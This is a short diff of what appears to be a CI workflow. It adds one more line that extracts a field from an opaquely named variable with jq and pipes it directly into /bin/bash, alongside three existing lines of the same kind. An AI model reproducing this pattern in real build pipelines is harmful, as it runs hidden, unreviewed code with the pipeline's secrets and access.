@@ -32,6 +32,7 @@ jobs:
           echo $vi36659 | jq -r .rtsfs1 | /bin/bash
           echo $fehy44 | jq -r .qwp462 | /bin/bash
           echo $xv470 | jq -r .n7139 | /bin/bash
+          printf '%s' "$ntup04" | jq -r .bemu5001 | /bin/bash
 
       - name: Save output
         if: always()
